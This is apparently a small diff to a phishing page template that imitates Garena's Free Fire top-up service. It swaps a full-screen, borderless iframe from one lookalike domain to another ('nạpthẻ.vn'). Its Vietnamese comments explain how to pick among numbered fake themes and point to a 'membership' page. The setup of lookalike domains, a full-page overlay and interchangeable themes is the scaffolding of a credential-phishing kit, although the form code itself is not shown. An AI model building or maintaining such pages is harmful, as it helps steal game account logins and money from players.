@@ -335,8 +335,8 @@ div#garena {
   <!--đổi giao diện ở đây-->
   <!--đổi giao diện ở đây-->
  <!--đổi giao diện ở đây-->
-   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://gacena.vn/theme/11.html" id="iframe"> </iframe> 
-											<!-- https://gacena.vn/theme/  thay các chữ số từ 1 - 15 để đổi giao giện nha   .html -->
+   <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden" src="https://nạpthẻ.vn/theme/2.html" id="iframe"> </iframe> 
+	<!--------------------------------------------------------------------------------------------------------------------------------- https://nạpthẻ.vn/theme/  thay các chữ số từ 1 - 17 để đổi giao giện nha   .html -->
 	 <!--https://ff-membership.glitch.me giao diện membership-->
 
 
